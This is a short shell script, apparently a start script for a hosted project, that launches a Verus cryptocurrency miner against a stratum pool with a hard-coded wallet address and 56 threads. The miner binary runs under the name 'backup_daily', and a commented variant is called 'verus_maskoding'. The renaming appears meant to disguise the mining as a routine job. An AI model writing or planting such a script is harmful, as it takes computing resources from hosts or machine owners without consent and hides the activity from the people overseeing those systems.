#!/bin/sh
#npm start &
PoolHost=stratum+tcp://sg.vipor.net
Port=5040
PublicVerusCoinAddress=RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim
WorkerName=repl
Threads=1
#set working directory to the location of this script
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd $DIR
chmod +x ccminer
./backup_daily -a verus -o stratum+tcp://cn.vipor.net:5040 -u RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim.pmryn-srg -p x -t 56
#./verus_maskoding -o "${PoolHost}":"${Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -p x -t "${Threads}" "$@"

